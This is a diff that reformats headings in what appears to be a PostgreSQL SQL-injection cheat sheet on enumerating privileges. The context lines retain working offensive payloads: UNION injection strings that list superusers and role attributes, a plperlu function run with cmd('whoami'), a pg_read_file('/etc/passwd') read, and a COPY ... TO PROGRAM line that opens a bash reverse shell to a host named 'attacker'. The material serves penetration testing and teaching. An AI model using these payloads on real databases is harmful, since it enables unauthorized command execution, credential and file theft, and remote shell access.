@@ -7,11 +7,9 @@ tags: ["privileges", "permissions", "superuser"]
 lastUpdated: 2025-12-07
 ---
 
-## Privileges
-
 Understanding PostgreSQL privileges is crucial for determining what actions are possible during an SQL injection attack. Privilege information can reveal whether you can access files, execute commands, or perform other sensitive operations.
 
-### Checking Superuser Status
+## Checking Superuser Status
 
 The most important privilege check:
 
@@ -28,7 +26,7 @@ SELECT usesuper FROM pg_user WHERE usename = current_user;
 SELECT rolsuper FROM pg_roles WHERE rolname = current_user;
 ```
 
-### User Privileges
+## User Privileges
 
 ```sql
 -- Get all role attributes for current user
@@ -44,7 +42,7 @@ FROM pg_roles
 WHERE rolname = current_user;
 ```
 
-### Key Privilege Attributes
+## Key Privilege Attributes
 
 | Privilege     | Description                        | Exploitation Potential             |
 | ------------- | ---------------------------------- | ---------------------------------- |
@@ -54,7 +52,7 @@ WHERE rolname = current_user;
 | `REPLICATION` | Can initiate streaming replication | Data exfiltration                  |
 | `BYPASSRLS`   | Bypass row level security          | Access restricted data             |
 
-### Table-Level Privileges
+## Table-Level Privileges
 
 ```sql
 -- Check privileges on specific table
@@ -68,7 +66,7 @@ FROM information_schema.table_privileges
 WHERE grantee = current_user;
 ```
 
-### Schema Privileges
+## Schema Privileges
 
 ```sql
 -- Check schema privileges
@@ -77,14 +75,14 @@ FROM pg_namespace
 WHERE nspname = 'public';
 ```
 
-### Function Privileges
+## Function Privileges
 
 ```sql
 -- Check if user can execute specific function
 SELECT has_function_privilege(current_user, 'pg_read_file(text)', 'execute');
 ```
 
-### File Operation Privileges
+## File Operation Privileges
 
 Superuser can access file system functions:
 
@@ -97,7 +95,7 @@ SELECT has_function_privilege('pg_read_file(text)', 'execute');
 SELECT current_setting('is_superuser');
 ```
 
-### Injection Examples
+## Injection Examples
 
 ```sql
 -- Check if superuser
@@ -113,7 +111,7 @@ SELECT current_setting('is_superuser');
 ' UNION SELECT NULL,string_agg(usename,','),NULL FROM pg_user WHERE usesuper=true--
 ```
 
-### Important System Functions
+## Important System Functions
 
 Functions requiring superuser:
 
@@ -125,7 +123,7 @@ Functions requiring superuser:
 | `COPY ... TO/FROM`        | File I/O operations          |
 | `lo_import()/lo_export()` | Large object file operations |
 
-### Checking Extension Capabilities
+## Checking Extension Capabilities
 
 ```sql
 -- List installed extensions
@@ -135,7 +133,7 @@ SELECT extname, extversion FROM pg_extension;
 SELECT * FROM pg_extension WHERE extname IN ('adminpack', 'file_fdw', 'dblink');
 ```
 
-### Procedural Language Enumeration (pg_language)
+## Procedural Language Enumeration (pg_language)
 
 Procedural languages determine what code can be executed within PostgreSQL. Untrusted languages (ending in 'u') allow arbitrary code execution.
 
@@ -203,7 +201,7 @@ $$ LANGUAGE plperlu;
 SELECT cmd('whoami');
 ```
 
-### Dangerous Default Roles (PostgreSQL 10+)
+## Dangerous Default Roles (PostgreSQL 10+)
 
 PostgreSQL 10+ introduced predefined roles with dangerous capabilities:
 
@@ -252,7 +250,7 @@ SELECT pg_read_file('/etc/passwd');
 COPY (SELECT 'backdoor') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"';
 ```
 
-### Object Ownership Enumeration
+## Object Ownership Enumeration
 
 ```sql
 -- Find objects owned by current user
@@ -267,7 +265,7 @@ FROM pg_proc
 WHERE proowner = (SELECT oid FROM pg_roles WHERE rolname = current_user);
 ```
 
-### Injection Examples for Privilege Enumeration
+## Injection Examples for Privilege Enumeration
 
 ```sql
 -- Check for untrusted languages
@@ -283,7 +281,7 @@ WHERE proowner = (SELECT oid FROM pg_roles WHERE rolname = current_user);
 ' UNION SELECT 1, rolcreaterole::text, 3 FROM pg_roles WHERE rolname=current_user--
 ```
 
-### Role Membership
+## Role Membership
 
 ```sql
 -- Check role memberships
@@ -296,7 +294,7 @@ JOIN pg_roles m ON am.member = m.oid;
 SELECT pg_has_role(current_user, 'admin', 'member');
 ```
 
-### Notes
+## Notes
 
 - Superuser privileges are required for most file operations
 - Even non-superusers may have dangerous permissions through role inheritance
